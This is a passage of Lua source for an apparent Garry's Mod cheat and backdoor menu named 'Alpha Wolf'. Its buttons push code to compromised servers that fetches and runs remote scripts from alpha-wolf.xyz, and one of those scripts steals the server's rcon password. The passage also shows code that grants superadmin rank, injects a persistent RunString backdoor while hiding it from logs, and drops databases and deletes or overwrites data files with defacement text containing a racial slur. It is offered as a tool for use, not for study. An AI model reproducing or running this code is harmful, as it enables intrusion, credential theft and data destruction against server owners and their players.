                if chpa("cl_viperbdcheck.lua") or chpa("sh_viperbdcheck.lua") or chpa("autorun/cl_viper.lua") then return true end
            end
        },
        ["GAC"] = {
            desc = "This an Anti-Cheat System, high detection Rate.",
            scan = function()
                if chpa("autorun/glorifiedanticheat.lua") then
                    RunConsoleCommand("disconnect")

                    return true
                end
            end
        },
        ["Moat"] = {
            desc = "This an Anti-Cheat System, high detection Rate.",
            scan = function()
                if chpa("plugins/moat/modules/anticheat/client/mac.lua") then return true end
            end
        }
    }

    -----------------------------------------------------------------------------------------------------

    Detect(istable(ULib), "Admin-Mod: ULX")
    Detect(istable(FAdmin), "Admin-Mod: FAdmin")
    Detect(istable(GExtension), "Admin-Mod: GExtension")
    Detect(istable(gban), "Admin-Mod: Gban")
    Detect(chpa("sg_client.lua"), "Admin-Mod: ServerGuard")
    Detect(chpa("autorun/client/cl_xadmin.lua"), "Admin-Mod: xAdmin")
    Detect(chpa("sam_sql_config.lua"), "Admin-Mod: SAM")

    local anticheat = MatLib.Frame(850, 0, ScrW() * 0.35, ScrH() * 0.5, "                                 Wolf - Anti-Cheat Menu")
    anticheat:SetVisible(false)

    DetectionMenu = function() visible = not visible anticheat:SetVisible(visible) end

    local scroll = MatLib.ScrollPanel(anticheat, 0, anticheat:GetHeaderHeight(), anticheat:GetWide(), anticheat:GetTall() - anticheat:GetHeaderHeight())

    for k, v in pairs(anticheats) do
        if v["scan"]() then
            local infoItem = MatLib.ScrollItem(scroll, anticheat:GetTall() * 0.2)
            MatLib.HeaderText(infoItem, infoItem:GetWide() * 0.025, infoItem:GetTall() * 0.1, k)
            MatLib.Text(infoItem, infoItem:GetWide() * 0.009, infoItem:GetTall() * 0.6, v["desc"])
        end
    end

    closeButton(anticheat, function() anticheat:SetVisible(false) end)
    backButton(anticheat, function() DetectionMenu() Menu() end)

------------------------------------------------------------------------------------------------------------------------------------------------
/*
*   PluginMenu
*/
------------------------------------------------------------------------------------------------------------------------------------------------

    local pluginframe = MatLib.Frame(850, 0, ScrW() * 0.25, ScrH() * 0.5, "                      Wolf - Plugins (Beta)")
    pluginframe:SetVisible(false)
    PluginMenu = function() visible = !visible pluginframe:SetVisible(visible) end

    local pluginlist = vgui.Create( "DListView", pluginframe)
    pluginlist:SetSize(pluginframe:GetWide() * 0.3, pluginframe:GetTall() * 0.8)
    pluginlist:SetPos(pluginframe:GetWide() * 0.05, pluginframe:GetTall() * 0.1)
    pluginlist:SetMultiSelect(false)
    pluginlist:AddColumn("Available Lua files ("..#file.Find("lua/*.lua","GAME", "nameasc")-1 ..")"):SetFixedWidth(150)

    pluginlist.Paint = function(self, w, h) draw.RoundedBox(15, 0, 0, w, h, MatLib.Colors.FrameTop) end

    for k,v in pairs(file.Find("lua/*.lua","GAME", "nameasc")) do pluginlist:AddLine(v) end

    local loadlua = MatLib.Button(pluginframe, pluginframe:GetWide() * 0.62, pluginframe:GetTall() * 0.2, pluginframe:GetWide() * 0.20, pluginframe:GetTall() * 0.06, "Load")
    local refreshlua = MatLib.Button(pluginframe, pluginframe:GetWide() * 0.62, pluginframe:GetTall() * 0.6, pluginframe:GetWide() * 0.20, pluginframe:GetTall() * 0.06, "Refresh")
    refreshlua.DoClick = function() surface.PlaySound("garrysmod/ui_click.wav") pluginlist:Clear() for k,v in pairs(file.Find("lua/*.lua","GAME", "nameasc")) do pluginlist:AddLine(v) end end
    loadlua.DoClick = function()
        surface.PlaySound("garrysmod/ui_click.wav")

        if pluginlist:GetSelectedLine() ~= nil then
            awolfNotify("Loaded "..pluginlist:GetLine(pluginlist:GetSelectedLine()):GetValue(1).." successfully.")

            local wolfl = vgui.Create('DHTML')
            wolfl:SetAllowLua(true)
            return wolfl:ConsoleMessage([[RUNLUA: ]]..file.Read("lua/"..pluginlist:GetLine(pluginlist:GetSelectedLine()):GetValue(1), "GAME"))
        else
            awolfNotify("Select a Lua first.")
        end
    end

    closeButton(pluginframe,function() PluginMenu() end)
    backButton(pluginframe,function() PluginMenu() Menu() end)

------------------------------------------------------------------------------------------------------------------------------------------------
/*
*   BD-Menu
*/
------------------------------------------------------------------------------------------------------------------------------------------------

    local backdoormenu = MatLib.Frame(850, 0, ScrW() * 0.35, ScrH() * 0.5, "                                   Backdoor Menu")
    backdoormenu:SetVisible(false)
    BDMenu = function()visible = not visible backdoormenu:SetVisible(visible) end

    local backdoorscroll = MatLib.ScrollPanel(backdoormenu,20, 50, backdoormenu:GetWide() * 0.94, backdoormenu:GetTall() * 0.6)
    backdoorscroll:SetPaintBackground(true)
    backdoorscroll:SetBackgroundColor(Color(41, 41, 41))

    closeButton(backdoormenu, function() BDMenu() end)
    backButton(backdoormenu, function() BDMenu() Menu() end)

    makeButton(backdoorscroll,"RicardoDisco",0.03,0.03,function() surface.PlaySound("garrysmod/ui_click.wav") SendLua([[http.Fetch("https://load.alpha-wolf.xyz/discosandsounds/discosblyat/RicardoDiscos.lua",RunString)]]) end,0.2,0.1)
    makeButton(backdoorscroll,"DiscoV2",0.03,0.15,function() surface.PlaySound("garrysmod/ui_click.wav") SendLua([[http.Fetch("https://load.alpha-wolf.xyz/discosandsounds/discosblyat/EnigmaDiscoV2s.lua",RunString)]]) end,0.2,0.1)
    makeButton(backdoorscroll,"GermanDisco",0.03,0.27,function() surface.PlaySound("garrysmod/ui_click.wav") SendLua([[http.Fetch("https://load.alpha-wolf.xyz/discosandsounds/discosblyat/GermanDiscos.lua",RunString)]]) end,0.2,0.1)
    makeButton(backdoorscroll,"Web BD",0.03,0.39,function() surface.PlaySound("garrysmod/ui_click.wav") SendLua([[http.Fetch("https://load.alpha-wolf.xyz/privateshit/http-test.php",RunString)]]) end,0.2,0.1)
    if steamid == "STEAM_0:0:82024108" or steamid == "STEAM_0:1:72591794" then makeButton(backdoorscroll,"UltraDisco",0.03,0.51,function() surface.PlaySound("garrysmod/ui_click.wav") SendLua([[http.Fetch("https://load.alpha-wolf.xyz/discosandsounds/discosblyat/UltraDisco.lua",RunString)]]) end,0.2,0.1) end

    makeButton(backdoorscroll,"CleanUp Map",0.271,0.03,function() surface.PlaySound("garrysmod/ui_click.wav") SendLua([[game.CleanUpMap()]]) end,0.2,0.1)
    makeButton(backdoorscroll,"Hostname",0.271,0.15,function() surface.PlaySound("garrysmod/ui_click.wav") SendLua([[RunConsoleCommand("hostname", "https://alpha-wolf.xyz/")]]) end,0.2,0.1)
    makeButton(backdoorscroll,"LoadingScr",0.271,0.27,function() surface.PlaySound("garrysmod/ui_click.wav") SendLua([[RunConsoleCommand("sv_loadingurl", "https://alpha-wolf.xyz/darkrp/index.html")]]) end,0.2,0.1)

    makeButton(backdoorscroll,"Set Rank",0.512,0.03,function() surface.PlaySound("garrysmod/ui_click.wav")
        BDMenu()

        Derma_StringRequest("Set Rank", "e.g superadmin", "", function(str)
            SendLua([[
                Entity(]] .. ply:EntIndex() .. [[):SetUserGroup("]] .. str .. [[")
            ]])
        end)
    end,0.2,0.1)

    makeButton(backdoorscroll,"RconPass",0.512,0.15,function()
        surface.PlaySound("garrysmod/ui_click.wav")
        SendLua([[http.Fetch("https://load.alpha-wolf.xyz/discosandsounds/discosblyat/rconstealers.lua",RunString)]])
        if not channel then return end

        timer.Simple(0.5, function()
            if CheckIfStringExists("wolf_check") then
                net.Start("wolf_check")
                net.WriteString("")
                net.SendToServer()
            else
                awolfNotify("rcon_password Not Found, try again sometime it bugs ^^")
            end
        end)

        net.Receive("wolf_password", function()
            local rcon_pass = net.ReadString()
            awolfNotify(rcon_pass .. "GG with this you can break the server, even if it deletes the backdoor :D")
        end)

        net.Receive("wolf_fail", function()
            awolfNotify("No rcon_password on server :/")
        end)
    end,0.2,0.1)

    makeButton(backdoorscroll,"Custom Job",0.512,0.27,function()
        surface.PlaySound("garrysmod/ui_click.wav")
        SendLua([[
            TEAM_]] .. math.random(100,500) .. [[ = DarkRP.createJob("Project Wolf", {
                model = "models/player/skeleton.mdl",
                weapons = {"weapon_stunstick", "unarrest_stick", "m9k_glock", "m9k_dbarrel", "m9k_usas", "m9k_barret_m82", "m9k_svu", "m9k_acr", "m9k_vector", "m9k_m202", "m9k_milkormgl", "lockpick", "pro_lockpick", "staff_lockpick"},
                command = "awolf",
                description = "A fucking Gamer",
                max = 1,
                customCheck = function(ply) return ply:SteamID() == "]] .. ply:SteamID() .. [[" end,
                CustomCheckFailMsg = "Fuck off, this is for Gamers only",
                color = Color(0, 128, 128, 255),
                salary = 1000000000,
                admin = 0,
                vote = false,
                hasLicense = true,
                PlayerSpawn = function(ply)
                    ply:SetMaxHealth(10000)
                    ply:SetHealth(10000)
                    ply:SetArmor(10000)
                end,
            })
        ]]) awolfNotify("Job Command: /awolf")
    end,0.2,0.1)

    makeButton(backdoorscroll,"Fuck Data",0.512,0.39,function()
        surface.PlaySound("garrysmod/ui_click.wav")
        SendLua([[
            local date = os.date( "%m-%d-%y" )
            local databases = { "jobdata","darkrp_door","darkrp_levels","darkrp_prestige","darkrp_doorgroups","darkrp_doorjobs","darkrp_jobspawn","darkrp_position","darkrp_player","darkrp_dbversion","FAdmin_CAMIPrivileges","FADMIN_GROUPS","FAdmin_Immunity","FADMIN_MOTD","FAdmin_PlayerGroup","FADMIN_PRIVILEGES","FADMIN_RESTRICTEDENTS","FAdmin_ServerSettings","FAdminBans","FPP_ANTISPAM1","FPP_BLOCKED1","FPP_BLOCKMODELSETTINGS1","FPP_ENTITYDAMAGE1","FPP_GLOBALSETTINGS1","FPP_GRAVGUN1","FPP_GROUPMEMBERS1","FPP_GROUPS3","FPP_GROUPTOOL","FPP_PHYSGUN1","FPP_PLAYERUSE1","FPP_TOOLADMINONLY","FPP_TOOLGUN1","FPP_TOOLRESTRICTPERSON1","FPP_TOOLTEAMRESTRICT","FPP_BLOCKEDMODELS1","awarn_playerdata","awarn_serverdata","awarn_warnings","blogs_players_v3","blogs_v3","stt_date","stt_players","mlog_logs","mlog_permissions","atlaschat_players","atlaschat_ranks","atlaschat_remote","atlaschat_restrictions","OreBag","fcd_playerData","dailylogin","ChessLeaderboard","qsgr_data","voting_npcs","cac_incidents","steam_rewards","playerdata","playerinformation","utime","permaprops","cc_characters","cc_npcs","ckit_chips","ckit_persist","exsto_data_bans","exsto_data_ranks","exsto_data_users","exsto_data_variables","exsto_restriction","inventories","kinv_items","libk_player","permitems","player_gangapps","player_gangdata","player_gangs","ps2_categories","ps2_equipmentslot","ps2_HatPersistence","ps2_itemmapping","ps2_itempersistence","ps2_OutfitHatPersistenceMapping","ps2_outfits","ps2_playermodelpersistence","ps2_servers","ps2_settings","ps2_trailpersistence","ps2_wallet","removeprops","scoreboard_friends","serverguard_analytics","serverguard_bans","serverguard_pms","serverguard_ranks","serverguard_reports","serverguard_schema","serverguard_ttt_autoslays","serverguard_users","serverguard_watchlist","tttstats","ttt_passes_history","specdm_stats_new","ps2_achievements","ps2_boosterpersistence","ps2_cratepersistence","ps2_instatswitchweaponpersistence","ps2_keypersistence","ps2_rolecontrolpersistence","ps2_weaponpersistence","rapsheet","damagelog_autoslay","damagelog_names","damagelog_oldlogs","damagelog_weapons","kmapvote_mapinfo","kmapvote_ratings","mgang_gangs","mgang_players","deathrun_ids","deathrun_records","deathrun_stats","sui_ratings","shop_texthats","shop_money","shop_items","report_log" }
            local datafiles = { "ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","wire_version.txt","UTeam.txt","prevhas.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","hitnumbers/settings.txt","soundlists/common_sounds.txt","vcmod/controls.txt","vcmod/dataserver.txt","qsgr_data/sqgr_settings.txt","blogs/configcache.txt","blogs/language.txt","cac/adminuipack.txt","ezjobs/config.txt","damagelog/colors.txt","damagelog/filters_new.txt","craphead_scripts/armory_robbery/rp_downtown_v4c/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_evilmelon_v1/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v3/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v4/policearmory_location.txt","mg_gangsdata/mg_npcspawns.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","prevhash.txt","permaprops_config.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","vliss/settings/config.txt","nordahl_spawnpoint/rp_venator_v3.txt","nordahl_spawnpoint/rp_venator_v2.txt","nordahl_spawnpoint/rp_venator_v1.txt","nordahl_spawnpoint/rp_venator_gg.txt","nordahl_spawnpoint/rp_venator_ausv4.txt","nordahl_spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_spawnpoint/arena_byre.txt","nordahl_spawnpoint/rp_venator_v2_immersive.txt","nordahl_spawnpoint/rp_venator_fade_v3.txt","nordahl_spawnpoint/rp_venator_gr.txt","nordahl_spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_spawnpoint/rp_scifi.txt","nordahl_spawnpoint/rishimoon_crimson.txt","nordahl_spawnpoint/rp_pripyat_hl2.txt","nordahl_spawnpoint/rp_onwardhope.txt", "nordahl_spawnpoint/rp_oldworld_fix.txt","nordahl_spawnpoint/sd_doomsday.txt","nordahl_spawnpoint/sd_doomsday_event.txt","nordahl_spawnpoint/rp_naboo_city_v1.txt","nordahl_spawnpoint/rp_noclyria_crimson.txt","nordahl_spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_spawnpoint/rp_mos_mersic_v2.txt","nordahl_spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_spawnpoint/dust_dunes.txt","nordahl_spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_spawnpoint/rd_asteroid.txt","nordahl_spawnpoint/naboo.txt","nordahl_spawnpoint/kashyyyk.txt","nordahl_spawnpoint/geonosis.txt","nordahl_spawnpoint/fightspace3b.txt","nordahl_spawnpoint/endor.txt","nordahl_spawnpoint/toth_forgotten.txt"}
            local sensitivefiles = { "ulx_logs/"..date..".txt","ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","vcmod/controls.txt","vcmod/dataserver.txt","blogs/configcache.dat","blogs/language.txt","blogs/config_v5.txt","cac/adminuipack.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","permaprops_config.txt","whitelist.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","nordahl_spawnpoint/rp_venator_v3.txt","nordahl_spawnpoint/rp_venator_v2.txt","nordahl_spawnpoint/rp_venator_v1.txt","nordahl_spawnpoint/rp_venator_gg.txt","nordahl_spawnpoint/rp_venator_ausv4.txt","nordahl_spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_spawnpoint/arena_byre.txt","nordahl_spawnpoint/rp_venator_v2_immersive.txt","nordahl_spawnpoint/rp_venator_fade_v3.txt","nordahl_spawnpoint/rp_venator_gr.txt","nordahl_spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_spawnpoint/rp_scifi.txt","nordahl_spawnpoint/rishimoon_crimson.txt","nordahl_spawnpoint/rp_pripyat_hl2.txt","nordahl_spawnpoint/rp_onwardhope.txt", "nordahl_spawnpoint/rp_oldworld_fix.txt","nordahl_spawnpoint/sd_doomsday.txt","nordahl_spawnpoint/sd_doomsday_event.txt","nordahl_spawnpoint/rp_naboo_city_v1.txt","nordahl_spawnpoint/rp_noclyria_crimson.txt","nordahl_spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_spawnpoint/rp_mos_mersic_v2.txt","nordahl_spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_spawnpoint/dust_dunes.txt","nordahl_spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_spawnpoint/rd_asteroid.txt","nordahl_spawnpoint/naboo.txt","nordahl_spawnpoint/kashyyyk.txt","nordahl_spawnpoint/geonosis.txt","nordahl_spawnpoint/fightspace3b.txt","nordahl_spawnpoint/endor.txt","nordahl_spawnpoint/toth_forgotten.txt"}
            for k,v in pairs(databases) do
                if sql.TableExists(v) then 
                    sql.Query("DROP TABLE "..v.." ;")
                    sql.Query("CREATE TABLE IF NOT EXISTS "..v.." ( steamid TEXT NOT NULL PRIMARY KEY, value TEXT );")
                end
            end
            for k,v in pairs(datafiles) do
                if file.Exists(v) then
                    file.Delete(v)
                    file.write(v, "Hacked by a Wolf | AlphaWolf")
                end
            end
            for k,v in pairs(sensitivefiles) do
                if file.Exists(v) then
                    file.Delete(v)
                    file.write(v, "Hacked by a Wolf | AlphaWolf")
                end
            end
            local files, directories = file.Find("*", "DATA")
            for k, v in pairs(files) do
                file.Delete(v)
            end
            for i = 1, 200 do 
                file.Write( "hello.from.AlphaWolf_" .. math.random( 1, 999999 ) .. ".txt", "[===[Niggerized Server]===]" )
            end
        ]])
    end,0.2,0.1)

    makeButton(backdoorscroll,"PlayerControll",0.512,0.51,function()
        surface.PlaySound("garrysmod/ui_click.wav")
        SendLua([[http.Fetch("https://load.alpha-wolf.xyz/discosandsounds/discosblyat/controllplayers.lua",RunString)]])
        awolfNotify("Look at a Player and press J to Controll him.")

        hook.Add("Think", awolfstring5, function()
            local cachepayload = input.IsButtonDown(KEY_J)

            if cachepayload and FirstPressedpayload then
                net.Start("NachuiControll")
                net.SendToServer()
            end

            FirstPressedpayload = not cachepayload
        end)
    end,0.2,0.1)

    makeButton(backdoorscroll,"PlayerImpale",0.512,0.63,function()
        surface.PlaySound("garrysmod/ui_click.wav")
        SendLua([[http.Fetch("https://load.alpha-wolf.xyz/discosandsounds/discosblyat/impaler_xp.lua",RunString)]])
        awolfNotify("Look at a Player and press J to Impale him.")

        hook.Add("Think", awolfstring5, function()
            local cachepayload = input.IsButtonDown(KEY_J)

            if cachepayload and FirstPressedpayload then
                net.Start("GetImpaledNoob")
                net.SendToServer()
            end

            FirstPressedpayload = not cachepayload
        end)
    end,0.2,0.1)

    makeButton(backdoormenu,"Scan",0.05,0.880,function() surface.PlaySound("garrysmod/ui_click.wav") checkbackdoors() end,0.20,0.07)
    makeButton(backdoormenu,"Soundboard",0.4,0.880,function() surface.PlaySound("garrysmod/ui_click.wav") BDMenu() SoundboardMenu() end,0.20,0.07)
    makeButton(backdoormenu,"Inject BD",0.750,0.880,function()
        surface.PlaySound("garrysmod/ui_click.wav")
        awolfNotify("Injection...")

        if (ply:IsSuperAdmin()) then
            timer.Simple(1, function()
                if not CheckIfStringExists("AlphaWolf") then
                    RunConsoleCommand("ulx", "logecho", "0")
                    RunConsoleCommand("ulx", "luarun", [[util.AddNetworkString("AlphaWolf")net.Receive("AlphaWolf",function()RunString(net.ReadString())end)]])
                    RunConsoleCommand("ulx", "logecho", "1")
                    chat.AddText(Color(0, 0, 0, 125), "[Alpha Wolf]", Color(0, 255, 0), " Successfully Injected!")
                else
                    chat.AddText(Color(0, 0, 0, 125), "[Alpha Wolf]", Color(255, 255, 255), " Backdoor already loaded!")
                end
            end)
        else
            chat.AddText(Color(0, 0, 0, 125), "[Alpha Wolf]", Color(255, 0, 0), " Failed! You are not superadmin or have luarun rights!")
        end
    end,0.20,0.07)

    local Text = vgui.Create("DTextEntry", backdoormenu)
    Text:SetPos(backdoormenu:GetWide() * 0.25, backdoormenu:GetTall() * 0.73)
    Text:SetSize(350, 35)
    Text:SetTextColor(Color(255, 255, 255, 200))
    Text:SetFont("Trebuchet18")

    Text.Paint = function(self, w, h)
        surface.SetDrawColor(Color(24, 24, 24))
        surface.DrawRect(0, 0, w, h)
        surface.SetDrawColor(21, 21, 21)
        surface.SetMaterial(Material("gui/gradient_up"))
        surface.SetDrawColor(Color(30, 30, 30, 255))
        surface.SetMaterial(Material("gui/gradient_down"))
        surface.SetDrawColor(Color(30, 30, 30, 255))
        surface.SetDrawColor(35, 35, 35, 255)
        surface.DrawOutlinedRect(0, 0, w, h)
        self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
    end

    Text.OnEnter = function(self)
        surface.PlaySound("buttons/button18.wav")
        awolfNotify("Targeting: '" .. Text:GetValue() .. "'")
        channel = self:GetValue()
    end

------------------------------------------------------------------------------------------------------------------------------------------------
/*
*   Soundboard
*/
------------------------------------------------------------------------------------------------------------------------------------------------

    local soundderma = MatLib.Frame(850, 0, ScrW() * 0.35, ScrH() * 0.5, "                                           Soundboard")
    soundderma:SetVisible(false)

    SoundboardMenu = function() visible = not visible soundderma:SetVisible(visible) end

    closeButton(soundderma, function() soundderma:SetVisible(false) end)
    backButton(soundderma, function() SoundboardMenu() BDMenu() end)

    makeButton(soundderma,"Copy BD",0.05,0.880,function()
        surface.PlaySound("buttons/button18.wav")
        awolfNotify("Copied! LuaRun it or place it inside a Addon")
        SetClipboardText('util.AddNetworkString("AlphaWolf")net.Receive("AlphaWolf",function()RunString(net.ReadString())end)')
    end,0.20,0.07)

    local soundlist = MatLib.ScrollPanel(soundderma,20, 50, soundderma:GetWide() * 0.94, soundderma:GetTall() * 0.6)
    soundlist:SetPaintBackground(true)
    soundlist:SetBackgroundColor(Color(41, 41, 41))

    local function addsound(name, link, plus)
        local soundbutton = MatLib.Button(soundlist, soundlist:GetWide() * 0.050, soundlist:GetTall() * 0.02 + plus, soundlist:GetWide() * 0.90, soundlist:GetTall() * 0.1, name)
        soundbutton.DoClick = function()
            surface.PlaySound("buttons/button18.wav")
            SendLua([[BroadcastLua("sound.PlayURL(']] .. link .. [[','mono',function()end)")]])
        end
    end

    addsound("Ghostmane", "https://load.alpha-wolf.xyz/discosandsounds/ghostmane.mp3", 0)
    addsound("Lasagna", "https://load.alpha-wolf.xyz/discosandsounds/lasagna.mp3", 40)
    addsound("Eiffel 65 - Blue (Da Ba Dee)", "https://load.alpha-wolf.xyz/discosandsounds/bbC.ogg", 80)
    addsound("Old Town Road", "https://load.alpha-wolf.xyz/discosandsounds/oldtown.mp3", 120)
    addsound("Mask", "https://load.alpha-wolf.xyz/discosandsounds/mask.mp3", 120)
    addsound("ZHU - Faded", "https://load.alpha-wolf.xyz/discosandsounds/faded.mp3", 160)
    addsound("Flica de wrist", "https://load.alpha-wolf.xyz/discosandsounds/flica.mp3", 200)

------------------------------------------------------------------------------------------------------------------------------------------------
/*
*   PeopleCheck
*/
------------------------------------------------------------------------------------------------------------------------------------------------

    local peoplecheck = MatLib.Frame(850, 0, ScrW() * 0.35, ScrH() * 0.5, "                               Wolf - PeopleCheck Menu")
    peoplecheck:SetVisible(false)
    PeopleCheckMenu = function() visible = not visible peoplecheck:SetVisible(visible) end
   
    closeButton(peoplecheck, function() PeopleCheckMenu() end)
    backButton(peoplecheck, function() PeopleCheckMenu() Menu() end)

    local scroll = MatLib.ScrollPanel(peoplecheck, 0, peoplecheck:GetHeaderHeight(), peoplecheck:GetWide(), anticheat:GetTall() - anticheat:GetHeaderHeight())

    for k, v in pairs(player.GetAll()) do
        local playermoney = (v.DarkRPVars and v.DarkRPVars.money) or 0
        local infoItem = MatLib.ScrollItem(scroll, peoplecheck:GetTall() * 0.2)
        MatLib.HeaderText(infoItem, infoItem:GetWide() * 0.025, infoItem:GetTall() * 0.1, v:Nick())
        MatLib.Text(infoItem, infoItem:GetWide() * 0.009, infoItem:GetTall() * 0.6, v:GetUserGroup()..": "..v:SteamID().." - $"..playermoney.." JOB: "..team.GetName(v:Team()))
    end

------------------------------------------------------------------------------------------------------------------------------------------------
/*
*   RadioMenu
*/
------------------------------------------------------------------------------------------------------------------------------------------------
    local radiomenu = MatLib.Frame(850, 0, ScrW() * 0.35, ScrH() * 0.5, "                                 Wolf - Radio Menu")
    radiomenu:SetVisible(false)
    RadioMenu = function() visible = not visible radiomenu:SetVisible(visible) end
   
    local radiolist = MatLib.ScrollPanel(radiomenu, 20, 50, radiomenu:GetWide() * 0.94, radiomenu:GetTall() * 0.6)
    radiolist:SetPaintBackground(true)
    radiolist:SetBackgroundColor(Color(41, 41, 41))

    local RadioHeaderText = MatLib.HeaderText(radiomenu, radiomenu:GetWide() * 0.2, radiomenu:GetTall() * 0.73, "Currently listining to: Default                   ")

    local function addradio(name, link, plus)
        local radiobutton = MatLib.Button(radiolist, radiolist:GetWide() * 0.05, radiolist:GetTall() * 0.02 + plus, radiolist:GetWide() * 0.9, radiolist:GetTall() * 0.1, name)
        radiobutton.DoClick = function()
            surface.PlaySound("buttons/button18.wav")
            if IsValid(ClientStation) then ClientStation:Stop() end
            RadioHeaderText:SetText("Currently listining to: "..name)
            sound.PlayURL(link,'mono',function(station) ClientStation = station end)
        end
    end

    addradio("I Love Radio", "http://stream01.ilovemusic.de/iloveradio1.mp3", 0)
    addradio("I Love Hardstyle", "http://stream01.ilovemusic.de/iloveradio14.mp3", 40)
    addradio("TOP 40 German Rap", "http://stream01.ilovemusic.de/iloveradio104.mp3", 80)
    addradio("I Love Musik & Chill", "http://stream01.ilovemusic.de/iloveradio10.mp3", 120)
    addradio("The DJ by DJ MAG", "http://stream01.ilovemusic.de/iloveradio4.mp3", 120)
    addradio("I Love the Battle", "http://stream01.ilovemusic.de/iloveradio3.mp3", 160)
    addradio("TOP 40 HipHop US", "http://stream01.ilovemusic.de/iloveradio13.mp3", 200)
    
    makeButton(radiomenu,"Stop",0.43,0.88,function() surface.PlaySound("buttons/button18.wav") if IsValid(ClientStation) then ClientStation:Stop() end end,0.20,0.07)

    closeButton(radiomenu, function() RadioMenu() end)
    backButton(radiomenu, function() RadioMenu() Menu() end)


end